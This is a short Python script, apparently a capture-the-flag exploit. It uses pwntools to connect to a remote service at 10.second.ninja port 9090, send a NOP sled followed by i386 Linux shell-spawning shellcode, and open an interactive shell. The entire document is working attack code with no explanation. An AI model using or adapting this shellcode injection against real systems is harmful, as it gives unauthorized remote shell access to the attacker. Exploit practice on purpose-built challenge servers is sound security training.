from pwnlib.tubes.remote import remote
from pwnlib.asm import asm
from pwnlib.shellcraft.i386.linux import sh
from time import sleep

r = remote('10.second.ninja', 9090)
r.send('\x90'*22 + asm(sh()))
sleep(1)
r.interactive()
